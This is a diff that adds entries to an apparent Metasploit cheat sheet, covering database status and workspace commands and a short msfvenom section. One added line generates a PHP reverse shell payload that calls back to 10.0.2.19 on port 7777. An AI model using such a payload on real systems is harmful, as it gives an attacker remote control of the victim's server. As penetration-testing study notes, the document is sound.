@@ -27,6 +27,22 @@ db_nmap <target> # Store results in the database
 hosts # View stored hosts
 services # View stored services
 search portscan # List port scanning modules
+db_status # Check the database status 
+workspace # List availables workspaces
+workspace -a <workspace_name> # Add a workspace
+workspace -d <workspace_name> # Delete a workspace
+
+
+# =========
+# MSF Venom
+# =========
+
+msfvenom -l payloads # List msfvenom payloads
+msfvenom --list format # List supported output formats
+msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > # Generating a Reverse Shell
+
+
+
 
 
 
